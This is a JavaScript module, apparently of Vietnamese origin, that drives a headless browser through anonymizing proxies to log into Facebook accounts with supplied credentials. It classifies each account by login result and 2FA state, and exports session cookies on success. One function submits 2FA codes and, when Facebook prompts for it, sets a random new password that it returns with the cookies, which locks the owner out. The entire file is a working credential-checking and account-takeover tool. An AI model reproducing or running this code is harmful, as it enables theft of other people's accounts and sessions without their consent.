const puppeteer = require('puppeteer');
const proxyChain = require('proxy-chain');

async function getConfigInfo(ip, port, username, password) {
    const config = {
        host: ip,
        port: port,
        username: username,
        password: password
    };
    return config;
}
async function check(username, password, proxyInfo) {
    let status;
    let cookies;
    const launchOptions = {
        headless: "new"
    };

    if (proxyInfo.host && proxyInfo.port && proxyInfo.username && proxyInfo.password) {
        const proxyUrl = `http://${proxyInfo.username}:${proxyInfo.password}@${proxyInfo.host}:${proxyInfo.port}`;
        const newProxyUrl = await proxyChain.anonymizeProxy(proxyUrl);
        launchOptions.args = [
            `--proxy-server=${newProxyUrl}`,
            '--no-sandbox',
            '--disable-setuid-sandbox'
        ];
    }
    else if (proxyInfo.host && proxyInfo.port) {
        const proxyUrl = `http://${proxyInfo.host}:${proxyInfo.port}`;
        const newProxyUrl = await proxyChain.anonymizeProxy(proxyUrl);
        launchOptions.args = [
            `--proxy-server=${newProxyUrl}`,
            '--no-sandbox',
            '--disable-setuid-sandbox'
        ];
    }
    else {
        launchOptions.args = [
            '--no-sandbox',
            '--disable-setuid-sandbox'
        ];
    }

    const browser = await puppeteer.launch(launchOptions);
    const page = await browser.newPage();
    try {
        await page.goto('https://mbasic.facebook.com');
        await page.type('input[name="email"]', username);
        await page.type('input[name="pass"]', password);
        await page.click('input[type="submit"]');
        const loginError = await page.$('#login_error');
        if (loginError) {
            await browser.close();
            return {
                status: 'Sai mật khẩu'
            };
        } else {
            if (page.url().includes('checkpoint')) {
                const twoFactor = await page.$('#approvals_code');
                if (twoFactor) {
                    const checkSms = await browser.newPage();
                    await checkSms.goto('https://mbasic.facebook.com/checkpoint/?having_trouble=1');
                    const smsEnable = await checkSms.$('input[type="radio"][value="sms_requested"]');
                    if (smsEnable) {
                        await checkSms.evaluate((element) => {
                            element.checked = true;
                        }, smsEnable);
                        await checkSms.click('input[type="submit"]');
                        await browser.close();
                        return {
                            status: '2FA SMS'
                        };
                    }
                    else {
                        await browser.close();
                        return {
                            status: '2FA'
                        };
                    }
                }
                else {
                    await browser.close();
                    return {
                        status: 'CHECKPOINT'
                    };
                }
            } else {
                await page.goto('https://mbasic.facebook.com')
                await page.goto('https://mbasic.facebook.com')
                const login_input = await page.$('input[name="email"]');
                if (login_input) {
                    await browser.close();
                    return {
                        status: 'Sai mật khẩu'
                    };
                }
                cookies = (await page.cookies()).map(cookie => {
                    delete cookie.sameSite;
                    return cookie;
                });
                await browser.close();
                return {
                    status: 'Không bật 2FA',
                    cookies
                };
            }
        }
    } catch (error) {
        await browser.close();
        return { status: 'Lỗi', error };
    }
}
function generateRandomPassword(length) {
    const charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+';
    let password = '';
    for (let i = 0; i < length; i++) {
        const randomIndex = Math.floor(Math.random() * charset.length);
        password += charset[randomIndex];
    }
    return password;
}
async function enterCode(username, password, code, proxyInfo) {
    let status;
    let cookies;
    let newpass;
    const launchOptions = {
        headless: "new"
    };

    if (proxyInfo.host && proxyInfo.port && proxyInfo.username && proxyInfo.password) {
        const proxyUrl = `http://${proxyInfo.username}:${proxyInfo.password}@${proxyInfo.host}:${proxyInfo.port}`;
        const newProxyUrl = await proxyChain.anonymizeProxy(proxyUrl);
        launchOptions.args = [
            `--proxy-server=${newProxyUrl}`,
            '--no-sandbox',
            '--disable-setuid-sandbox'
        ];
    }
    else if (proxyInfo.host && proxyInfo.port) {
        const proxyUrl = `http://${proxyInfo.host}:${proxyInfo.port}`;
        const newProxyUrl = await proxyChain.anonymizeProxy(proxyUrl);
        launchOptions.args = [
            `--proxy-server=${newProxyUrl}`,
            '--no-sandbox',
            '--disable-setuid-sandbox'
        ];
    }
    else {
        launchOptions.args = [
            '--no-sandbox',
            '--disable-setuid-sandbox'
        ];
    }

    const browser = await puppeteer.launch(launchOptions);
    const page = await browser.newPage();
    try {
        await page.goto('https://mbasic.facebook.com');
        await page.type('input[name="email"]', username);
        await page.type('input[name="pass"]', password);
        await page.click('input[type="submit"]');
        const loginError = await page.$('#login_error');
        if (loginError) {
            await browser.close();
            return {
                status: 'Sai mật khẩu'
            };
        } else {
            if (page.url().includes('checkpoint')) {
                const twoFactor = await page.$('#approvals_code');
                if (twoFactor) {
                    await page.type('input[name="approvals_code"]', code);
                    await page.click('input[type="submit"]');
                    const wrongCode = await page.$('#approvals_code');
                    if (wrongCode) {
                        await browser.close();
                        return {
                            status: 'Sai mã 2FA'
                        };
                    }
                    else {
                        let currentUrl = page.url();
                        let i = 0;
                        while (i < 8) {
                            if (currentUrl.includes('checkpoint')) {
                                const submitButton = await page.$('input[type="submit"]');
                                if (submitButton) {
                                    await page.click('input[type="submit"]');
                                }
                                const newPassword = await page.$('input[name="password_new"]');
                                if (newPassword) {
                                    const randomPassword = generateRandomPassword(8);
                                    await page.type('input[name="password_new"]', randomPassword);
                                    await page.click('input[type="submit"]');
                                    newpass = randomPassword;
                                    status = "2FA NEW PASS";
                                }
                                await new Promise(resolve => setTimeout(resolve, 500));
                                currentUrl = page.url();
                            }
                            else {
                                cookies = (await page.cookies()).map(cookie => {
                                    delete cookie.sameSite;
                                    return cookie;
                                });
                                break;
                            }
                            i++;
                        }
                        if (i === 8) {
                            await browser.close();
                            return { status: 'CHECKPOINT' };
                        }
                        if (newpass) {
                            await browser.close();
                            return { status, newpass, cookies };
                        }
                        else {
                            await browser.close();
                            return { status, cookies };
                        }
                    }
                }
                else {
                    await browser.close();
                    return {
                        status: 'CHECKPOINT'
                    };
                }
            } else {
                await page.goto('https://mbasic.facebook.com')
                await page.goto('https://mbasic.facebook.com')
                const login_input = await page.$('input[name="email"]');
                if (login_input) {
                    await browser.close();
                    return {
                        status: 'Sai mật khẩu'
                    };
                }
                cookies = (await page.cookies()).map(cookie => {
                    delete cookie.sameSite;
                    return cookie;
                });
                await browser.close();
                return {
                    status: 'Không bật 2FA',
                    cookies
                };
            }
        }
    } catch (error) {
        await browser.close();
        return { status: 'Lỗi', error };
    }
}

module.exports = {
    getConfigInfo,
    check,
    enterCode,
};
